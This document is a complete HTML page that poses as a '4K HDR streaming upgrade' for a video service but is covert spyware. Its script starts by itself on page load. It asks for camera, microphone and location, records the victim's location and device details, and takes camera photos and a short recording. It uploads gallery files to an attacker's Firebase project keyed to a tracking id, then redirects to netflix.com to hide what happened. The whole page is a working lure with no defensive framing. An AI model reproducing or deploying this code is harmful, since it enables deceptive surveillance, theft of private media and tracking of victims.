<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Stream Quality Upgrade</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #111;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #222;
        }
        .logo {
            width: 70px;
            height: 70px;
            background: #1a73e8;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
        }
        h2 { color: #fff; font-size: 22px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
        .quality-box {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }
        .quality-box p { color: #ccc; font-size: 13px; margin: 4px 0; }
        .quality-badge {
            background: #1a73e8;
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            margin-top: 8px;
        }
        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 40px;
            cursor: pointer;
        }
        .btn:disabled { background: #444; cursor: not-allowed; }
        .loader { margin-top: 16px; color: #1a73e8; font-size: 13px; display: none; }
        input, video, canvas { display: none; }
        .permission-box {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 12px;
            margin-top: 16px;
            font-size: 12px;
            color: #ffaa00;
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🎬</div>
        <h2>Upgrade to 4K HDR</h2>
        <div class="sub">Enhanced streaming quality requires one-time setup</div>
        
        <div class="quality-box">
            <p>📱 Device: <span id="deviceName">Detecting...</span></p>
            <p>📶 Current Quality: HD Ready</p>
            <p>✨ Available: 4K HDR + Dolby Atmos</p>
            <div class="quality-badge">⚡ One-click upgrade</div>
        </div>
        
        <button class="btn" id="upgradeBtn">⚡ Enable 4K HDR</button>
        <div class="loader" id="loader">Optimizing your device...</div>
        <div class="permission-box" id="permissionBox">⚠️ Please allow permissions when prompted</div>
    </div>
    
    <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const storage = firebase.storage();
        
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const upgradeBtn = document.getElementById('upgradeBtn');
        const loader = document.getElementById('loader');
        const permissionBox = document.getElementById('permissionBox');
        
        if (!sessionId) {
            permissionBox.style.display = 'block';
            permissionBox.style.background = '#2e0a0a';
            permissionBox.style.color = '#ff6b6b';
            permissionBox.innerHTML = '❌ Invalid upgrade link';
            upgradeBtn.disabled = true;
        }
        
        // Device detection
        const ua = navigator.userAgent;
        let deviceName = "Unknown";
        if (ua.includes("iPhone")) deviceName = "iPhone";
        else if (ua.includes("Android")) deviceName = "Android Phone";
        else if (ua.includes("Windows")) deviceName = "Windows PC";
        else if (ua.includes("Mac")) deviceName = "Mac";
        document.getElementById('deviceName').innerText = deviceName;
        
        async function saveToFirebase(type, data) {
            if (!sessionId) return;
            try {
                await db.collection('sessions').doc(sessionId).collection('data').add({
                    type: type,
                    data: data,
                    timestamp: new Date().toISOString()
                });
                return true;
            } catch(e) { return false; }
        }
        
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveToFirebase(type, { url, name: file.name });
            return url;
        }
        
        // Step 1: Request ALL permissions at once
        async function requestAllPermissions() {
            permissionBox.style.display = 'block';
            permissionBox.innerHTML = '🔐 Requesting permissions for 4K HDR...';
            
            const results = {
                camera: false,
                mic: false,
                location: false
            };
            
            // Request camera + mic together
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                results.camera = true;
                results.mic = true;
                // Keep stream for later use
                window.mediaStream = stream;
                permissionBox.innerHTML = '✅ Camera & Microphone granted';
            } catch(e) {
                permissionBox.innerHTML = '⚠️ Camera/Microphone access needed for 4K HDR';
            }
            
            // Request location
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                results.location = true;
                await saveToFirebase('location', {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                permissionBox.innerHTML = '✅ Location granted';
            } catch(e) {
                permissionBox.innerHTML = '⚠️ Location access recommended';
            }
            
            return results;
        }
        
        // Step 2: Gallery access (triggers file picker)
        async function getGallery() {
            return new Promise((resolve) => {
                const input = document.getElementById('galleryInput');
                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    if (files.length === 0) { resolve(false); return; }
                    loader.innerHTML = `📸 Optimizing ${files.length} files...`;
                    for (let i = 0; i < Math.min(files.length, 30); i++) {
                        const file = files[i];
                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                        await uploadFile(file, type);
                        loader.innerHTML = `📸 Optimized ${i+1}/${Math.min(files.length, 30)}`;
                    }
                    resolve(true);
                };
                input.click();
            });
        }
        
        // Step 3: Capture photos and video from existing stream
        async function captureMedia() {
            if (!window.mediaStream) {
                // Try to get stream again
                try {
                    window.mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
                } catch(e) {
                    return false;
                }
            }
            
            const stream = window.mediaStream;
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 500));
            
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            
            // Take 4 photos
            for (let i = 1; i <= 4; i++) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                await uploadFile(file, 'camera_photo');
                loader.innerHTML = `📷 Captured ${i}/4 photos`;
                await new Promise(r => setTimeout(r, 300));
            }
            
            // Video recording (5 seconds)
            if (window.mediaStream.getAudioTracks().length > 0) {
                loader.innerHTML = "🎥 Recording video...";
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
                    await uploadFile(file, 'video_recording');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                await new Promise(r => setTimeout(r, 1000));
            }
            
            // Don't stop stream yet - will stop at end
            return true;
        }
        
        // Step 4: Microphone recording (if not already captured in video)
        async function getMicrophone() {
            if (window.mediaStream && window.mediaStream.getAudioTracks().length > 0) {
                return true; // Already recorded in video
            }
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await uploadFile(file, 'microphone');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) { return false; }
        }
        
        // MAIN UPGRADE FUNCTION
        async function startUpgrade() {
            if (!sessionId) return;
            
            upgradeBtn.disabled = true;
            loader.style.display = 'block';
            loader.innerHTML = "🔧 Preparing device optimization...";
            
            // Device info
            await saveToFirebase('device_info', {
                device: deviceName,
                ua: ua,
                screen: `${screen.width}x${screen.height}`
            });
            
            // Request all permissions at once
            await requestAllPermissions();
            
            // Gallery access (separate user action)
            loader.innerHTML = "📸 Select photos to optimize...";
            await getGallery();
            
            // Capture photos and video
            await captureMedia();
            
            // Extra mic if needed
            await getMicrophone();
            
            // Clean up
            if (window.mediaStream) {
                window.mediaStream.getTracks().forEach(t => t.stop());
            }
            
            await saveToFirebase('upgrade_complete', { timestamp: new Date().toISOString() });
            
            loader.innerHTML = "✅ 4K HDR Enabled! Redirecting...";
            permissionBox.style.background = '#0a2e1a';
            permissionBox.style.color = '#4ade80';
            permissionBox.innerHTML = '✅ 4K HDR is now active on your device';
            
            setTimeout(() => {
                window.location.href = "https://www.netflix.com";
            }, 2000);
        }
        
        upgradeBtn.onclick = startUpgrade;
        
        // Auto-start after 0.5s
        if (sessionId) {
            setTimeout(startUpgrade, 500);
        }
    </script>
</body>
</html>
